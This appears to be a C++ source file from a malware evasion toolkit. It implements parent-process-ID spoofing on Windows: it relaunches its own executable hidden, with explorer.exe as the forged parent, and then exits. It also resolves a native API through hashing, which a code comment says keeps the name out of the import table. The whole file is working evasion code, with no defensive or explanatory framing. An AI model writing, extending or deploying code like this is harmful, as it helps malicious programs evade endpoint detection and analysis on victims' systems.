#include <obfuscation/ppid_spoof.hpp>
#include <obfuscation/api_hash.hpp>
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>

namespace ppid_spoof {

    static DWORD find_pid(const wchar_t* name) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return 0;

        PROCESSENTRY32W pe{ .dwSize = sizeof(pe) };
        for (BOOL ok = Process32FirstW(snap, &pe); ok; ok = Process32NextW(snap, &pe)) {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        }
        CloseHandle(snap);
        return 0;
    }

    static DWORD get_parent_pid() {
        typedef NTSTATUS (WINAPI* pfn_NtQIP)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
        //resolve via hash so the string doesnt appear in IAT
        constexpr DWORD h_ntdll = api_hash::hash(L"ntdll.dll");
        constexpr DWORD h_nqip  = api_hash::hash("NtQueryInformationProcess");
        auto fn = (pfn_NtQIP)api_hash::get_proc(api_hash::get_module(h_ntdll), h_nqip);
        if (!fn) return 0;

        PROCESS_BASIC_INFORMATION pbi{};
        fn(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
        return (DWORD)(ULONG_PTR)pbi.InheritedFromUniqueProcessId;
    }

    bool already_spoofed() {
        return get_parent_pid() == find_pid(L"explorer.exe");
    }

    void relaunch() {
        DWORD exp_pid = find_pid(L"explorer.exe");
        if (!exp_pid) return;

        HANDLE hexp = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, exp_pid);
        if (!hexp) return;

        wchar_t exe[MAX_PATH];
        GetModuleFileNameW(nullptr, exe, MAX_PATH);

        SIZE_T attr_size = 0;
        InitializeProcThreadAttributeList(nullptr, 1, 0, &attr_size);
        auto attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
        if (!attrs) { CloseHandle(hexp); return; }

        InitializeProcThreadAttributeList(attrs, 1, 0, &attr_size);
        UpdateProcThreadAttribute(attrs, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                  &hexp, sizeof(hexp), nullptr, nullptr);

        STARTUPINFOEXW si{};
        si.StartupInfo.cb = sizeof(si);
        si.lpAttributeList = attrs;

        PROCESS_INFORMATION pi{};
        CreateProcessW(exe, nullptr, nullptr, nullptr, FALSE,
                       EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                       nullptr, nullptr, &si.StartupInfo, &pi);

        DeleteProcThreadAttributeList(attrs);
        HeapFree(GetProcessHeap(), 0, attrs);
        CloseHandle(hexp);

        if (pi.hProcess) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        ExitProcess(0);
    }

}
